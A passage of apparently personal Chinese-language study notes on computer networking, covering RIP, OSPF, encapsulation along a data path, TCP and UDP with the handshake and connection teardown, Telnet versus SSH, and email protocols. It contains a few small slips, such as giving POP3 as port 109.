src="/../image/image-20240924165808938.png" alt="image-20240924165808938"></p><h4 id="路由表的初始化-1"><a href="#路由表的初始化-1" class="headerlink" title="路由表的初始化"></a>路由表的初始化</h4><p><img src="/../image/image-20240924170035527.png" alt="image-20240924170035527"></p><h4 id="RIP协议的缺点"><a href="#RIP协议的缺点" class="headerlink" title="RIP协议的缺点"></a>RIP协议的缺点</h4><ul><li>RIP 限制了网络的规模，它能使用的最大距离为15(不可达为16):</li><li>路由器之间交换的路由信息是路由器中的完整路由表，因而随着网络规模的扩大开销也就增加。</li><li>“坏消息传播得慢”，使更新过程的收敛时间过长。</li><li>依赖于固定的路由<strong>度量</strong>(代价)，不考虑真实距离和带宽。</li></ul><h3 id="OSPF路由协议"><a href="#OSPF路由协议" class="headerlink" title="OSPF路由协议"></a>OSPF路由协议</h3><p>开放最短路径优先协议OSPF(Open Shortest Path First)是一个典型的基于L-S算法的路由协议，它运行在IP协议之上，协议号为89。</p><ul><li>OSPF最主要的特征是使用分布式的链路状态协议。</li><li>“链路状态”是说明本路由器和哪些路由器相邻，以及该链路的“度量<br>metric)</li></ul><h4 id="OSPF特点"><a href="#OSPF特点" class="headerlink" title="OSPF特点"></a>OSPF特点</h4><ul><li>OSPF能提供负载均衡功能</li><li>OSPF允许将AS中的网络分成若干区域</li><li>OSPF允许灵活配置IP子网，支持无分类路由和特定分类网络的路由OSPF支持最佳(最长或最具体的)地址匹配</li><li>所有OSPF协议交换都要被鉴别</li><li>从外部得到的路由选择数据要在整个自治系统中通告</li></ul><h4 id="OSPF区域划分和路由类别"><a href="#OSPF区域划分和路由类别" class="headerlink" title="OSPF区域划分和路由类别"></a>OSPF区域划分和路由类别</h4><ul><li><p>OSPF使用层次结构的区域划分。在上层的区域叫做主干区域，其作用是连通其他在下层的区域。从其他区域来的信息都由区域边界路由器进行概括。</p></li><li><p>OSPF将一个规模很大的自治系统划分为若干个小的区域，每一个区域都有一个32bit的区域标识符。在一个区域内的路由器最好不超过200个。</p></li></ul><h4 id="OSPF区域划分举例"><a href="#OSPF区域划分举例" class="headerlink" title="OSPF区域划分举例"></a>OSPF区域划分举例</h4><p>【R6】ASBR(Autonomous System Boundary Router)自治系统边界路由器:和属于其它自治系统的路由器交换路由信息的路由器。在自治系统中的每一个路由器都知道到ASBR的路径。</p><p>【R5】BR(Backbone Router)骨干路由器:有一个接口连到骨干区域的路由器</p><p>【R7】ABR(Area BorderRouter)区边界路由器:连接到多个区域的路由器。</p><p>【R9】IR(Internal Router)内部路由器:路由器连接的所有网络都在同一个区域内。</p><p><img src="/../image/image-20240924200134003.png" alt="image-20240924200134003"></p><h4 id="OSPF基本路由选择算法-过程"><a href="#OSPF基本路由选择算法-过程" class="headerlink" title="OSPF基本路由选择算法(过程)"></a>OSPF基本路由选择算法(过程)</h4><ol><li>当路由器启动时，首先初始化路由协议数据结构</li><li>路由器使用OSPF的Hello协议获得邻居</li><li>路由器尝试与其新获得的邻居中的一些形成邻接。OSPF仅在邻接路由器上收发路由更新</li><li>路由器周期性地通告它的链路状态LSA</li><li>LSA在整个区域内洪泛发送。确保一个区域中的所有路由器有完全相同的链路状态数据库</li></ol><h5 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h5><p><img src="/../image/image-20240924200337621.png" alt="image-20240924200337621"></p><h5 id="OSPF最短路径树："><a href="#OSPF最短路径树：" class="headerlink" title="OSPF最短路径树："></a>OSPF最短路径树：</h5><p><img src="/../image/image-20240924200743738.png" alt="image-20240924200743738"></p><p><img src="/../image/image-20240924200753756.png" alt="image-20240924200753756"></p><h4 id="OSPF报文类型"><a href="#OSPF报文类型" class="headerlink" title="OSPF报文类型"></a>OSPF报文类型</h4><ul><li>Helo报文。路由器之间定时交换Helo报文，发现相邻路由器，维护邻居关系确定链路状态。另外，在具有多播或广播性能的物理网络，Helo包使用多播方式发送，允许动态地发现邻居路由器。</li><li>OSPF规定两个相邻路由器每隔10秒钟交换一次问候分组，以确定哪些邻站是可达的。</li><li>只有可达邻站的链路状态信息才存入链路状态数据库。</li><li>若40秒钟没有收到某个相邻路由器发来的问候分组，则认为该相邻路由器是不可达的，应立即修改链路状态数据库，并重新计算路由表。</li></ul><p><strong>OSPF用以下四种分组来进行链路状态数据库的同步。</strong></p><ol><li>Link State Update(链路状态更新包):链路状态更新报文用于节点之间广播的L-S信息。</li><li>Link State Acknowledgement(链路状态确认包):节点收到Link State Update报文后必须应答该报文。</li><li>Link State Request(链路状态请求包):局域网上一个路由器启动后向值班路由器发出该请求。</li><li>Database Description(数据库描述包):值班路由器以该报文响应LinkState Request报文，将自己的所有L-S信息下载给非值班路由器。</li></ol><h4 id="OSPF规定"><a href="#OSPF规定" class="headerlink" title="OSPF规定"></a>OSPF规定</h4><ul><li>两个同步的路由器叫做“完全邻接的”(fully adjacent)路由器。</li><li>OSPF每一个路由器用数据库描述分组与相邻路由器交换本数据库中已有的链路状态摘要信息。</li><li>为了确保链路状态数据库与全网的状态保持一致，OSPF每隔<strong>30min</strong>刷新一次数据库中的链路状态。</li><li>通过路由器之间交换的链路状态信息，每个路由器都可得出该互联网的链路状态数据库，算出以自己为根的最短路径树。根据最短路径树得出路由表。</li></ul><h2 id="数据传输过程总概"><a href="#数据传输过程总概" class="headerlink" title="数据传输过程总概"></a>数据传输过程总概</h2><h3 id="终端视角的数据传输"><a href="#终端视角的数据传输" class="headerlink" title="终端视角的数据传输"></a>终端视角的数据传输</h3><h4 id="终端侧数据传输特点"><a href="#终端侧数据传输特点" class="headerlink" title="终端侧数据传输特点"></a>终端侧数据传输特点</h4><ul><li>不清楚数据在传输过程中是否被重新封装&#x2F;解封装</li><li>只关心上层协议，下层协议可以通过上层协议掩盖</li></ul><p><img src="/../image/image-20240924201231429.png" alt="image-20240924201231429"></p><p><img src="/../image/image-20240924201313284.png" alt="image-20240924201313284"></p><h3 id="网络设备视角的数据传输"><a href="#网络设备视角的数据传输" class="headerlink" title="网络设备视角的数据传输"></a>网络设备视角的数据传输</h3><h4 id="网络侧数据传输特点"><a href="#网络侧数据传输特点" class="headerlink" title="网络侧数据传输特点"></a>网络侧数据传输特点</h4><ul><li>数据包的封装、解封装(针对互联网层、网络接入层)</li><li>协议首部的替换、修改(针对互联网层、网络接入层)</li></ul><p><img src="/../image/image-20240924201422072.png" alt="image-20240924201422072"></p><h4 id="路由器和交换机对数据的处理"><a href="#路由器和交换机对数据的处理" class="headerlink" title="路由器和交换机对数据的处理"></a>路由器和交换机对数据的处理</h4><p><img src="/../image/image-20240924201451444.png" alt="image-20240924201451444"></p><p><strong>设备操作说明</strong></p><table><thead><tr><th></th><th>工作层次</th><th>操作</th><th>职责</th></tr></thead><tbody><tr><td>交换机</td><td>网络接入层</td><td>1)查看以太网首部的目的硬件地址，发现是路由器<br />2)将数据帧发送给路由器。</td><td>以太网首部</td></tr><tr><td>路由器</td><td>互联网层、网络接入层</td><td>1)查看以太网首部的目的硬件地址，发现是自己<br />2)将数据帧<strong>解封装</strong>(剥除以太网首部)以查看互联网层IP首部)的目的逻辑地址，发现是终端B<br />3)根据该逻辑地址<strong>查询路由表</strong>以确定下一跳(这里假设下一跳即为终端B);<br />4)修改数据帧的目的硬件地址为终端B;<br />5)将数据帧<strong>重新封装</strong>(添加以太网首部)并发送给AP</td><td>IP首部</td></tr><tr><td>AP</td><td>网络接入层</td><td>1)查看以太网首部的目的硬件地址，发现是终端B<br />2)将数据帧解封装(剥除以太网首部)<br />3)将数据帧重新封装(替换为WLAN首部)并发送给终端B</td><td>以太网首部</td></tr></tbody></table><p><strong>终端B收到数据</strong></p><p><img src="/../image/image-20240924201826850.png" alt="image-20240924201826850"></p><h3 id="网络全局视角的数据传输"><a href="#网络全局视角的数据传输" class="headerlink" title="网络全局视角的数据传输"></a>网络全局视角的数据传输</h3><h4 id="全局视角的数据传输过程"><a href="#全局视角的数据传输过程" class="headerlink" title="全局视角的数据传输过程"></a>全局视角的数据传输过程</h4><p><img src="/../image/image-20240924201848852.png" alt="image-20240924201848852"></p><p><strong>终端B</strong></p><ul><li>自上而下封装数据以形成数据帧将数据帧发送给交换机A</li><li>将数据帧发送给交换机A</li></ul><p><img src="/../image/image-20240924201933808.png" alt="image-20240924201933808"></p><p><strong>交换机A</strong></p><ul><li>查看以太首部的目的硬件地址，发现是路由器A</li><li>将数据帧发送给路由器A</li></ul><p><img src="/../image/image-20240924202026769.png" alt="image-20240924202026769"></p><p><strong>路由器A</strong></p><ol><li>查看以太首部的目的硬件地址，发现是自己</li><li>将数据帧解封装(剥除以太网首部)以查看IP首部的目的逻辑地址，发现是终端C</li><li>根据该逻辑地址查询路由表，发现下一跳是路由器B;</li><li>修改数据帧的目的硬件地址为路由器B;</li><li>将数据帧重新封装(添加PPP首部)并发送给路由器B。</li></ol><p><img src="/../image/image-20240924202057463.png" alt="image-20240924202057463"></p><p><strong>路由器B</strong></p><ol><li>查看PPP首部的目的硬件地址，发现是自己;</li><li>将数据帧解封装(剥除PPP首部)以查看IP首部的目的逻辑地址，发现是终端C</li><li>根据该逻辑地址查询路由表，发现下一跳即为终端C;</li><li>修改数据帧的目的硬件地址为终端C;</li><li>将数据帧重新封装(添加以太网首部)并发送给交换机B、</li></ol><p><img src="/../image/image-20240924202129593.png" alt="image-20240924202129593"></p><p><strong>交换机B</strong></p><ul><li>查看以太首部的目的硬件地址，发现是终端C</li><li>将数据帧发送给终端C</li></ul><p><img src="/../image/image-20240924202151464.png" alt="image-20240924202151464"></p><p><strong>终端C</strong></p><ul><li>自下而上将数据帧解封装</li><li>得到原始数据</li></ul><p><img src="/../image/image-20240924202212573.png" alt="image-20240924202212573"></p><h4 id="TCP-x2F-IP模型视角"><a href="#TCP-x2F-IP模型视角" class="headerlink" title="TCP&#x2F;IP模型视角"></a>TCP&#x2F;IP模型视角</h4><p><img src="/../image/image-20240924202226974.png" alt="image-20240924202226974"></p><ul><li>重点1:封装、解封装的意义和特点</li><li>重点2:从终端设备观察数据传输(局部)</li><li>重点3:从网络设备观察数据传输(局部)</li><li>重点4:从网络拓扑观察数据传输(全局)</li></ul><h2 id="传输层概述"><a href="#传输层概述" class="headerlink" title="传输层概述"></a>传输层概述</h2><h3 id="传输层概述-1"><a href="#传输层概述-1" class="headerlink" title="传输层概述"></a>传输层概述</h3><p>两个主机进行通信实际上就是两个主机中的<strong>应用进程互相通信</strong>。IP地址是标识在因特网中的一个主机，而不是标识主机中的应用进程。传输层的一个重要功能就是<strong>复用和分用</strong>。</p><p><strong>传输层提供应用进程间的逻辑通信</strong>，“逻辑通信”的意思是当应用进程的报文到达传。输层后，从效果上看，就好像是直接沿<strong>水平方向</strong>传送到远地的传输层</p><h4 id="传输层在OSI参考模型中的地位"><a href="#传输层在OSI参考模型中的地位" class="headerlink" title="传输层在OSI参考模型中的地位"></a>传输层在OSI参考模型中的地位</h4><p><img src="/../image/image-20240924204601163.png" alt="image-20240924204601163"></p><h4 id="传输层通信示意图"><a href="#传输层通信示意图" class="headerlink" title="传输层通信示意图"></a>传输层通信示意图</h4><p><img src="/../image/image-20240924204637163.png" alt="image-20240924204637163"></p><h4 id="传输层与网络层"><a href="#传输层与网络层" class="headerlink" title="传输层与网络层"></a>传输层与网络层</h4><p><img src="/../image/image-20240924204734789.png" alt="image-20240924204734789"></p><p><img src="/../image/image-20240924204750968.png" alt="image-20240924204750968"></p><ul><li>网络层:提供数据转发路径</li><li>传输层:提供端到端的连接、不关心数据是如何传输的</li></ul><p><img src="/../image/image-20240924204817446.png" alt="image-20240924204817446"></p><ul><li><p>传输层为应用进程之间提供逻辑通信，而网络层是为主机之间提供逻辑通信</p></li><li><p>传输层要对收到的报文进行差错检测。网络层只检测IP数据报的首部中的字段而不检查数据部分。</p></li><li><p>应用进程对于数据传输通常有着各种不尽相同的要求</p></li><li><p>由网络层(IP协议)所提供的数据传输是不可靠的，传输层旨在通过一系列协议和机制来改善该不足之处</p></li></ul><p><img src="/../image/image-20240924205207068.png" alt="image-20240924205207068"></p><ul><li><p>仅使用一种协议很难在高效、可靠性之间达到权衡</p></li><li><p>为满足不同应用进程的要求，可以按照传输需求分为两类</p><ul><li><p>一类强调可靠性，允许少量延迟</p></li><li><p>一类强调高效性，允许部分丢包</p></li></ul></li><li><p>传输层的TCP和UDP分别针对这两类应用进程提供服务</p><ul><li><p>TCP的特点是面向连接的、可靠的、有序的</p></li><li><p>UDP的特点是面向无连接的、不可靠的、无序的</p></li></ul></li></ul><p>传输控制协议TCP(Transmission Control Protocol)。是一个基于连接的通信协议，提供可靠的数据传输，TCP提供传输保证，引入了确认、超时重发、流量控制和拥塞控制等机制，使数据正确的、无差错地到达目的地。</p><p>用户数据报协议UDP(User Datagram Protocol)。提供端到端的数据报的无连接服务，UDP几乎不进行检查，不确认保证报文到达，不很可靠，但效率较高</p><h4 id="传输层功能"><a href="#传输层功能" class="headerlink" title="传输层功能"></a>传输层功能</h4><p>①连接管理:连接的创建、维护与撤销</p><p>②流量控制:网络拥塞控制</p><p>③差错检测与恢复</p><p>④提供用户要求的服务质量</p><p>⑤提供端到端的可靠通信</p><p>⑥分段与重装: 分组大小不同时</p><h3 id="TCP概述"><a href="#TCP概述" class="headerlink" title="TCP概述"></a>TCP概述</h3><p><img src="/../image/image-20240924205410158.png" alt="image-20240924205410158"></p><p>当传输层采用面向连接的TCP协议时，尽管下面的网络是不可靠的，但这种逻辑通信信道就相当于一条<strong>全双工的可靠信道</strong>。</p><h4 id="端口号的作用"><a href="#端口号的作用" class="headerlink" title="端口号的作用"></a>端口号的作用</h4><h5 id="端口寻址-即通过端口识别应用-x2F-会话"><a href="#端口寻址-即通过端口识别应用-x2F-会话" class="headerlink" title="端口寻址(即通过端口识别应用&#x2F;会话)"></a>端口寻址(即通过端口识别应用&#x2F;会话)</h5><p><img src="/../image/image-20240924205504739.png" alt="image-20240924205504739"></p><h5 id="端口号的分类"><a href="#端口号的分类" class="headerlink" title="端口号的分类"></a>端口号的分类</h5><p><img src="/../image/image-20240924205522948.png" alt="image-20240924205522948"></p><h5 id="TCP协议常见端口号"><a href="#TCP协议常见端口号" class="headerlink" title="TCP协议常见端口号"></a>TCP协议常见端口号</h5><p><img src="/../image/image-20240924205539662.png" alt="image-20240924205539662"></p><h5 id="端口在进程之间的通信中所起的作用"><a href="#端口在进程之间的通信中所起的作用" class="headerlink" title="端口在进程之间的通信中所起的作用"></a>端口在进程之间的通信中所起的作用</h5><p><img src="/../image/image-20240924205851209.png" alt="image-20240924205851209"></p><p>UDP和TCP都使用与应用层接口处的端口(port)与上层的应用进程进行通信。</p><p><img src="/../image/image-20240924205920730.png" alt="image-20240924205920730"></p><p>端口号只具有<strong>本地意义</strong>，各端口独立地分配自己的端口号。</p><p>为了在通信时不致发生混乱，必须把端口号和主机的IP地址结合在一起使用</p><h3 id="UDP概述"><a href="#UDP概述" class="headerlink" title="UDP概述"></a>UDP概述</h3><p>UDP协议提供传输层最基本的功能，也就是负责连接端口的处理工作。</p><p>用户数据报(UDP)协议提供一种基本的、低时延的数据报传输，适用于一次传输少量突发报文的应用，UDP报头记录封包源端与目的端的连接端口信息，让封包能够正确地送达目的端的应用程序。</p><p>当传输层采用UDP协议时，这种逻辑通信信道则是一条不可靠信道</p><p>传输层提供的可靠的交付是指将数据可靠地交付给接收端的应用层</p><p><img src="/../image/image-20240924210012835.png" alt="image-20240924210012835"></p><h4 id="UDP协议的常见端口号"><a href="#UDP协议的常见端口号" class="headerlink" title="UDP协议的常见端口号"></a>UDP协议的常见端口号</h4><p><img src="/../image/image-20240924210029924.png" alt="image-20240924210029924"></p><h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><h4 id="根据应用层协议的数据传输需求"><a href="#根据应用层协议的数据传输需求" class="headerlink" title="根据应用层协议的数据传输需求"></a>根据应用层协议的数据传输需求</h4><ul><li>TCP多用于对数据可靠性有较高要求的应用层协议，例如网页、电子邮件、文件传输等</li><li>UDP多用于对延迟容忍度低的应用层协议，比如语音和视频</li><li>局部应用协议在实现时既会使用TCP，又会使用UDP。例如DNS，在实现数据的区域传送时将TCP作为传输层协议，而在实现域名解析时则将UDP作为传输层协</li></ul><h2 id="传输层协议"><a href="#传输层协议" class="headerlink" title="传输层协议"></a>传输层协议</h2><h3 id="传输层-2"><a href="#传输层-2" class="headerlink" title="传输层"></a>传输层</h3><p>当两台计算机进行通信时，首先要在下列方向取得一致:</p><ul><li>计算机一次发送多少信息;</li><li>接收到数据后如何验证完整性;</li><li>如何确定数据包是否在传输过程中丢失了</li></ul><p>传输层提供了端对端数据传输服务，并且在两台计算机之间建立了逻辑连接</p><p>传输层主要包含两种协议:TCP与UDP</p><h3 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h3><p>端口是传输层，TCP和UDP通过端口号识别服务</p><ol><li>端口号在0~1024之间的端口为通用端口，遵循相同的标准化方法</li><li>端口号在1024~49151之间的端口为注册端口，用于特定用途</li><li>端口号在49152~65535之间的 端口为动态端口，供有任何需求的应用程序使用。</li></ol><h3 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h3><h4 id="传输控制协议-TCP-介绍"><a href="#传输控制协议-TCP-介绍" class="headerlink" title="传输控制协议(TCP)介绍"></a>传输控制协议(TCP)介绍</h4><p>面向连接的，可靠的传输层协议传</p><p>输数据之前，要先建立连接</p><p>有可靠的传输机制</p><h4 id="TCP包格式"><a href="#TCP包格式" class="headerlink" title="TCP包格式"></a>TCP包格式</h4><p><img src="/../image/image-20240924212843096.png" alt="image-20240924212843096"></p><h4 id="可靠传输的实现"><a href="#可靠传输的实现" class="headerlink" title="可靠传输的实现"></a>可靠传输的实现</h4><h5 id="滑动窗口"><a href="#滑动窗口" class="headerlink" title="滑动窗口"></a><strong>滑动窗口</strong></h5><h5 id="超时重传"><a href="#超时重传" class="headerlink" title="超时重传"></a>超时重传</h5><p>上面滑动窗口的过程中的最后，介绍了发送方如果收不到确认的情况，会停止等待，并且超时重传。</p><h5 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h5><p>数据的传送与接收过程当中很可能出现收方来不及接收的情况，这时就需要对发方进行控制以免数据丢失。上面介绍了滑动窗口，如果窗口越大，发送速度也就越大，TCP可以使用控制滑动窗口的大小来进行控制速度，从而控制流量。</p><h4 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h4><p>这里用的是小林coding的图解网络<a href="https://xiaolincoding.com/">https://xiaolincoding.com/</a></p><p><img src="/../image/image-20240925100538632.png" alt="image-20240925100538632"></p><p><img src="/../image/image-20240925100557361.png" alt="image-20240925100557361"></p><p><img src="/../image/image-20240925100631019.png" alt="image-20240925100631019"></p><p>服务端收到客户端的 SYN 报文后，首先服务端也随机初始化自己的序号(server_isn )，将此序号填TCP 首部的「序号」字段中，其次把,TCP 首部的「确认应答号」字段填入 client isn+1.接着把 SYN和 ACK 标志位置为 1。最后把该报文发给客户端，该报文也不包含应用层数据，之后服务端处于 SYN-RCVD 状态。</p><p><img src="/../image/image-20240925100712420.png" alt="image-20240925100712420"></p><p>客户端收到服务端报文后，还要向服务端回应最后一个应答报文，首先该应答报文 TCP 首部 ACK 标志位置为 1，其次「确认应答号」字段填入server_isn+1 ，最后把报文发送给服务端，这次报文可以携带客户到服务器的数据，之后客户端处于 ESTABLISHED 状态服务器收到客户端的应答报文后，也进入 ESTABLISHED 状态。</p><p>从上面的过程可以发现第三次握手是可以携带数据的，前两次握手是不可以携带数据的，这也是面试常问的题。一旦完成三次握手，双方都处于ESTABLISHED 状态，此时连接就已建立完成，客户端和服务端就可以相互发送数据了。</p><h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><p><img src="/../image/image-20240925101007056.png" alt="image-20240925101007056"></p><p>客户端打算关闭连接，此时会发送一个TCP 首部 FIN 标志位被置为1的报文，也即 FIN 报文，之后客户端进入 FIN_WAIT_1 状态。</p><p>服务端收到该报文后，就向客户端发送 ACK 应答报文，接着服务端进入 CLOSED_WAIT 状态。</p><p>客户端收到服务端的 ACK 应答报文后，之后进入 FIN WAIT 2 状态。</p><p>等待服务端处理完数据后，也向客户端发送 FIN 报文，之后服务端进入LAST ACK 状态。</p><p>客户端收到服务端的 FIN 报文后，回一个 ACK 应答报文，之后进入 TIME WAIT 状态</p><p>服务器收到了ACK应答报文后，就进入了 CLOSED 状态，至此服务端已经完成连接的关闭</p><p>客户端在经过 2MSL一段时间后，自动进入CLOSED 状态，至此客户端也完成连接的关闭。</p><h3 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h3><p>用户数据包协议(UDP)UDP(User Datagram Protocol):是一个简单的面向数据报的传输层协议</p><p>如果过多的建立TCP连接，会造成很大的网络负担，而UDP协议可以相对快速地处理这些简单通信</p><p>UDP的不可靠性:把应用程序传给IP层的数据发送出去，但并不保证它们能到达目的地</p><p><img src="/../image/image-20240925103348026.png" alt="image-20240925103348026"></p><h4 id="UDP的首部"><a href="#UDP的首部" class="headerlink" title="UDP的首部"></a>UDP的首部</h4><p><img src="/../image/image-20240925103405770.png" alt="image-20240925103405770"></p><h4 id="UDP协议的常见端口号-1"><a href="#UDP协议的常见端口号-1" class="headerlink" title="UDP协议的常见端口号"></a>UDP协议的常见端口号</h4><p><img src="/../image/image-20240925103425782.png" alt="image-20240925103425782"></p><h2 id="远程访问协议"><a href="#远程访问协议" class="headerlink" title="远程访问协议"></a>远程访问协议</h2><h3 id="Telnet协议"><a href="#Telnet协议" class="headerlink" title="Telnet协议"></a>Telnet协议</h3><p>远程登录Telnet是一个简单的远程终端协议。用户使用Telnet就可在其所在地通过TCP连接注册(即登录)到远地的另一个主机上。</p><ul><li>能将用户的操作命令传到远地主机，也能将远地主机输出通过TCP连接返回到用户屏幕。</li><li>Telnet的默认端口号为23</li></ul><h4 id="Telnet的工作原理"><a href="#Telnet的工作原理" class="headerlink" title="Telnet的工作原理"></a>Telnet的工作原理</h4><ul><li>使用客户服务器方式。本地系统运行客户进程,远地主机则运行服务器进程。服务器的主进程等待新的请求,从属进程处理每一个连接。</li><li>定义了网络虚拟终端NVT(Network Virtual Terminal)。</li></ul><h4 id="角色定义"><a href="#角色定义" class="headerlink" title="角色定义"></a>角色定义</h4><ul><li>客户端:管理设备</li><li>服务器:被管理设备</li></ul><p><img src="/../image/image-20240925103816087.png" alt="image-20240925103816087"></p><h4 id="Telnet协议缺点"><a href="#Telnet协议缺点" class="headerlink" title="Telnet协议缺点"></a>Telnet协议缺点</h4><ul><li>不提供服务器认证，客户端无法识别服务器的身份</li><li>用户认证机制简单，仅支持密码认证;</li><li>用户认证信息以明文形式传输，容易被窃听</li><li>用户数据以明文形式传输，无机密性可言</li></ul><p><img src="/../image/image-20240925103902138.png" alt="image-20240925103902138"></p><h4 id="网络虚拟终端NVT格式"><a href="#网络虚拟终端NVT格式" class="headerlink" title="网络虚拟终端NVT格式"></a>网络虚拟终端NVT格式</h4><p><img src="/../image/image-20240925103928938.png" alt="image-20240925103928938"></p><h4 id="Telnet的过程"><a href="#Telnet的过程" class="headerlink" title="Telnet的过程"></a>Telnet的过程</h4><ul><li>建立与服务器23端口的TCP连接</li><li>从键盘上输入字符</li><li>把字符串变成NVT格式送给远程服务器</li><li>从远程服务器接收输出的信息，把该信息显示在您的屏幕上。</li></ul><h4 id="Telnet的使用"><a href="#Telnet的使用" class="headerlink" title="Telnet的使用"></a>Telnet的使用</h4><ol><li>首先建立与Internet的SLIP&#x2F;PPP连接，启动Telnet</li><li>选择Connect菜单，在HostName后输入远程计算机IP地址或域名，按connect键</li><li>远程计算机提示您输入用户名及密码</li></ol><h3 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h3><p>Secure Shell的缩写，由IETF的网络小组(Network WorkingSSH为Group)所制定。</p><p>SSH 为建立在应用层基础上的安全协议。SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。</p><p>利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。SSH最初是UNIX系统上的一个程序，后来又迅速扩展到其他操作平台。SSH在正确使用时可弥补网络中的漏洞。SSH客户端适用于多种平台。几乎所有UNIX平台一包括HP-UX、Linux、AIX、Solaris、Digital UNIX、lrix，以及其他平台，都可运行SSH。</p><ul><li>通信模型:C&#x2F;S</li><li>传输层协议:TCP</li><li>端口号:22</li><li>数据形式:密文</li></ul><h4 id="SSH工作原理"><a href="#SSH工作原理" class="headerlink" title="SSH工作原理"></a>SSH工作原理</h4><p>服务器组件会侦听指定的端口，并负责协商安全的连接、认证连接方，并且会衍生(spawn)一个正确的环境给已经认证的客户端。</p><p>客户端负责发起与服务器的 TCP 握手、协商安全连接、验证服务器的身份与之前记录的信息匹配，并且提供认证的凭证。</p><p>SSH 会话在两个独立的阶段建立，第一个阶段是协商建立加密以保护未来通讯的过程，第二个阶段就是认证阶段</p><ul><li>协商会话加密阶段。协调加密方式，交换计算会话密钥(Diffie-Hellman 算法)</li><li>认证阶段。一种是密码认证;一种是密钥对认证。</li></ul><h4 id="SSH协议的特点"><a href="#SSH协议的特点" class="headerlink" title="SSH协议的特点"></a>SSH协议的特点</h4><ul><li>提供服务器认证，客户端可以识别服务器的身份</li><li>用户认证机制既支持密码认证，也支持公钥认证</li><li>用户认证信息以密文形式传输，或者不传输</li><li>用户数据以密文形式传输</li></ul><p><img src="/../image/image-20240925161752522.png" alt="image-20240925161752522"></p><h2 id="电子邮件协议"><a href="#电子邮件协议" class="headerlink" title="电子邮件协议"></a>电子邮件协议</h2><h3 id="电子邮件概述"><a href="#电子邮件概述" class="headerlink" title="电子邮件概述"></a>电子邮件概述</h3><p>电子邮件(e-mail)也称电子信箱，是因特网上使用得最多和最受用户欢迎的一种应用。</p><p>电子邮件将邮件发送到ISP的邮件服务器，并放在其中的收信人邮箱(mailbox)中收信人可随时上网到ISP的邮件服务器进行读取。</p><p>e-mail不仅可传送文字信息，而且还可附上声音和图像。</p><h4 id="电子邮件系统发送过程示意"><a href="#电子邮件系统发送过程示意" class="headerlink" title="电子邮件系统发送过程示意"></a>电子邮件系统发送过程示意</h4><p>ARPANET上电子邮件标准是简单邮件传送协议SMTP(Simple Mail TransferProtocol),它已成为因特网的事实上的标准。</p><p><img src="/../image/image-20240925162207813.png" alt="image-20240925162207813"></p><ul><li>1993年又制定通用因特网邮件扩充MIME(MultipurposeInternet MailExtensions)。在邮件首部中说明了邮件数据类型。MIME邮件可同时传送多种类型的数据，在多媒体通信环境下非常有用。</li><li>电子邮件系统由用户代理、邮件服务器，以及电子邮件使用的协议 3个主要组成部件。</li></ul><h3 id="电子邮件组成部分"><a href="#电子邮件组成部分" class="headerlink" title="电子邮件组成部分"></a>电子邮件组成部分</h3><h4 id="电子邮件的主要构件"><a href="#电子邮件的主要构件" class="headerlink" title="电子邮件的主要构件"></a>电子邮件的主要构件</h4><p><img src="/../image/image-20240925162301638.png" alt="image-20240925162301638"></p><ul><li><p>MTA(Message Transport Agent)是邮件传输代理。常用的SMTP服务器(在Outlook或者Netscape Messenger中也经常称为发送服务器或者outgoing服务器)就是MTA。</p></li><li><p>MUA(Message User Agent)是邮件用户代理，是用户与电子邮件系统的接口。用户代理使用户能够通过一个友好的接口发送和接收电子邮件。</p></li><li><p>常用Outlook,Netscape Messenger,Foxmail及网易邮件或163邮件的Web界面，都是MUA。</p></li><li><p>撰写:给用户提供方便的编辑信件的环境。</p></li><li><p>显示:能够方便地在计算机屏幕上将信显示，</p></li><li><p>处理:包括发送和接收邮件。</p></li><li><p>邮件服务器是核心构件，它的功能是发送和接收邮件，并向发信人报告邮件传送的情况。</p></li><li><p>邮件服务器按照客户服务器方式工作，它需要两个协议;SMTP协议发送邮件端口号为25;POP3协议接收邮件，端口号为109。</p><ul><li>协议-SMTP(Simple Mail Transfer Protocol),简单邮件传输协议是在Internet上发送邮件的协议。邮件从撰写完毕到发送到达收件人信箱的所有网络传输都是依照SMTP的规范来进行的。</li><li>POP3(Post Office Protocol，邮局协议)和IMAP(Internet MessageAccess Protocol，Internet邮件存取协议)，邮件在成功发送后通常保存在收件人的信箱里。收件人可以通过POP3和IMAP协议来浏览信件。</li></ul></li></ul><h4 id="电子邮件的发送和接收过程"><a href="#电子邮件的发送和接收过程" class="headerlink" title="电子邮件的发送和接收过程"></a>电子邮件的发送和接收过程</h4><ol><li>发信人调用用户代理编辑发送邮件。用户代理用SMTP将邮件传送给发送端邮件服务器。</li><li>发送端邮件服务器将邮件放入邮件缓存队列中等待发送</li><li>运行在发送端邮件服务器的SMTP客户进程，向接收端邮件服务器发起TCP的连接</li><li>TCP建立后，SMTP客户开始向远程SMTP服务器进程发送邮件。发送完毕关闭TCP连接。</li><li>接收端邮件服务器收到后放入收信人邮箱</li><li>收信人在打算收信时，调用用户代理，使用POP3协议将自己的邮件从接收端邮件服务器的用户邮箱中取回。</li></ol><h4 id="电子邮件的组成"><a href="#电子邮件的组成" class="headerlink" title="电子邮件的组成"></a>电子邮件的组成</h4><ul><li><p>因特网上每个人的电子邮件地址都是唯一的。</p></li><li><p>发送电子邮件时，邮件服务器只使用电子邮件地址中的后一部分，即目的主机的域名。</p></li><li><p>只有在邮件到达目的主机后，目的主机的邮件服务器才根据电子邮件地址中的前一部分将邮件放在收件人的邮箱中。</p></li><li><p>由信封(envelope)和内容(content)组成。</p></li><li><p>TCP&#x2F;IP体系的电子邮件系统规定电子邮件地址(e-mailaddress)格式如下</p><ul><li><strong>收信人邮箱名@邮箱所在主机的域名</strong></li></ul></li><li><p>用户不需要填写电子邮件信封上的信息。</p></li></ul><h3 id="电子邮件的格式"><a href="#电子邮件的格式" class="headerlink" 